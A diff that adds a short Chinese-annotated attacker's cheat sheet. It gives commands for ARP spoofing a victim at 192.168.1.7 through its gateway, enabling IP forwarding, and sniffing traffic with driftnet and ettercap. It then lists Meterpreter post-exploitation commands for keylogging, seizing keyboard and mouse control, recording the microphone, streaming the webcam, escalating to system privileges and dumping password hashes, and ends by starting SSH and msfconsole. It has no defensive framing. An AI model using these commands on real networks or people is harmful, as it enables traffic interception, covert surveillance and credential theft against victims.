@@ -1,0 +1,44 @@
+sudo -s 登录
+apt-get install dsniff
+arpspoof -i（网卡）(ip 地址) （网关）
+arpspoof -i eth0 -t 192.168.1.7 192.168.1.1 断网
+echo 1 >/proc/sys/net/ipv4/ip_forward  进行IP流量转发
+apt-get update 更新
+apt-get install 下载
+driftnet -i eth0
+ettercap -Tq -i eth0
+
+----------------------------------------------------
+
+enumdesktops 用户登录数量
+keyscan_dump  键盘记录  下载
+keyscan_start  键盘记录  开始
+keyscan_stop  键盘记录  停止
+Uictl                 获取键盘鼠标控制权
+record_mic      音频录制
+webcam_chat    查看摄像头接口
+webcam_list     查看摄像头列表
+webcam_stream   摄像头视频获取
+Getsystem         获取最高权限
+Hashdump       下载HASH
+
+--------------------------------------------------------
+/etc/init.d/ssh start
+/etc/init.d/ssh status
+msfconsole
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
